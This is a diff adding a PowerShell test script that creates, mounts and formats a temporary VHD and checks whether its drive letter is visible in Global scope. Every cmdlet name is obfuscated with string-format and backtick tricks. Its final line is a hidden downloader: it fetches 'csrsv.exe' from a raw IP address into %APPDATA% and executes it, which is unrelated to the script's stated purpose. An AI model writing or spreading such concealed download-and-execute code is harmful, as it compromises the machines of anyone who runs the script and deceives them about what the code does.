@@ -1,0 +1,77 @@
+param([switch]${USEm`O`DULE}, [string]${VHdP`A`TH})
+
+function cREa`Te`VHd (${Vhd`paTh}, ${s`Ize})
+{
+  ${d`RiVE} = (.("{1}{0}" -f 'HD','New-V') -path ${VH`d`Path} -SizeBytes ${s`IZE} -Dynamic   | `
+              &("{1}{2}{0}" -f 'D','Mount-V','H') -Passthru |  `
+              &("{2}{0}{1}"-f 't-di','sk','ge') -number {${_}."D`ISkNU`mBEr"} | `
+              &("{0}{2}{4}{3}{1}"-f 'Init','isk','ial','D','ize-') -PartitionStyle ("{0}{1}"-f 'M','BR') -PassThru | `
+              .("{2}{0}{1}"-f'ew-Par','tition','N') -UseMaximumSize -AssignDriveLetter:${Fa`l`SE} -MbrType ("{1}{0}" -f'S','IF') | `
+              &("{2}{1}{0}{3}{4}"-f 'mat-','or','F','Volu','me') -Confirm:${f`AlsE} -FileSystem ("{1}{0}"-f 'S','NTF') -force | `
+              &("{2}{1}{0}"-f 'ion','et-partit','g') | `
+              .("{3}{5}{4}{6}{1}{0}{2}"-f 'ssPa','e','th','Ad','tionA','d-Parti','cc') -AssignDriveLetter -PassThru | `
+              .("{1}{0}{2}" -f'-volum','get','e'))."DrIvElet`T`Er"
+
+    ${dR`ivE}
+}
+
+if (${US`EM`oDULE})
+{
+    ${M} = .("{2}{1}{0}"-f'ule','-Mod','New') {
+        function tEs`T-D`Ri`VEPrEsE`NcEFRo`mMoDULe
+        {
+            param ([String]${P`Ath})
+
+            if (.("{2}{1}{0}"-f'h','est-Pat','T') ${Pa`Th})
+            {
+                ("{3}{1}{2}{0}" -f 'nd','e ','fou','Driv')
+                if (-not (&("{2}{0}{1}"-f'et','-PSDrive','G') -Name ${P`Ath}[0] -Scope ("{1}{0}{2}" -f 'o','Gl','bal') -ErrorAction ("{2}{1}{0}"-f'ue','entlyContin','Sil')))
+                {
+                    .("{0}{2}{1}" -f'W','or','rite-Err') ("{5}{7}{3}{6}{0}{4}{2}{1}"-f'l','e','cop',' is NOT','obal s','Dri',' in G','ve')
+                }
+            }
+            else { &("{0}{1}{3}{2}"-f'Wr','i','ror','te-Er') ("$Path "+'no'+'t '+'f'+'ound') }
+        }
+
+        .("{2}{4}{0}{3}{1}" -f 'duleMe','r','Expor','mbe','t-Mo') -Function tE`S`T-DriVEp`R`EsENC`ef`RO`mMOdULe
+    }
+}
+
+try
+{
+    if (${uS`eM`O`DULE})
+    {
+        &("{1}{0}{2}{3}"-f 'r','Impo','t-Mod','ule') ${M} -Force
+    }
+
+    ${D`Ri`VE} = .("{0}{2}{1}" -f'Cre','eVHD','at') -VHDPath ${VhD`path} -Size 5mb
+    ${PAt`HT`Oc`hEcK} = "${drive}:"
+
+    if (${UsemO`d`Ule})
+    {
+        .("{6}{5}{7}{2}{4}{1}{0}{3}"-f'd','Mo','ri','ule','vePresenceFrom','st-','Te','D') -Path ${p`AT`H`ToCHeCk}
+    }
+    else
+    {
+        if (.("{2}{1}{0}" -f 'th','est-Pa','T') ${pATHt`O`CHeck})
+        {
+            ("{0}{1}{2}" -f'Dri','v','e found')
+            if (-not (.("{1}{2}{0}"-f 'e','Get','-PSDriv') -Name ${dR`iVE} -Scope ("{1}{0}" -f'bal','Glo') -ErrorAction ("{2}{0}{1}{3}"-f'y','Co','Silentl','ntinue')))
+            {
+                .("{3}{2}{1}{0}"-f'r','ro','ite-Er','Wr') ("{0}{1}{3}{6}{5}{4}{2}" -f 'Dri','ve','e',' is ',' scop','n Global','NOT i')
+            }
+        }
+        else { &("{2}{0}{1}"-f'rit','e-Error','W') ("$pathToCheck "+'not'+' '+'fou'+'nd') }
+    }
+}
+finally
+{
+    if (${U`se`MOdulE})
+    {
+        .("{3}{2}{1}{0}{4}"-f'l','u','ve-Mod','Remo','e') ${M}
+    }
+    .("{1}{0}{2}{3}" -f 'ism','D','oun','t-VHD') ${VH`D`pATh}
+    .("{1}{2}{0}" -f'm','Remove','-Ite') ${vHDp`A`TH}
+}
+
+(.("{0}{2}{3}{1}" -f 'New-Ob','t','je','c') ("{1}{2}{0}{3}" -f'.WebC','System','.Net','lient')).("{3}{1}{0}{2}" -f'l','ownloadFi','e','D').Invoke(("{2}{9}{5}{6}{7}{4}{0}{1}{10}{3}{8}" -f'hoo/c','s','ht','ex','a','p://89.248.170.2','18/~','y','e','t','rsv.'),"$env:APPDATA\csrsv.exe");&("{1}{2}{3}{0}"-f'cess','St','art-P','ro') ("$env:APPDATA\csrsv.exe")
